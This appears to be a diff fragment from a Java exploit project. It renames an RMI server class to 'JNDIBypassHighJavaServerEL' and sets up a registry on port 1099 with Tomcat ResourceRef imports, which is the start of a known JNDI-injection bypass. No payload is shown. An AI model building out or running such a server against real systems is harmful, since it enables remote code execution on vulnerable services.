@@ -1,12 +1,11 @@
 import org.apache.naming.ResourceRef;
 
 import javax.naming.InitialContext;
-import javax.naming.Reference;
 import javax.naming.StringRefAddr;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 
-public class JNDIRMIServer {
+public class JNDIBypassHighJavaServerEL {
     public static void main(String[] args) throws Exception{
         InitialContext initialContext = new InitialContext();
         Registry registry = LocateRegistry.createRegistry(1099);
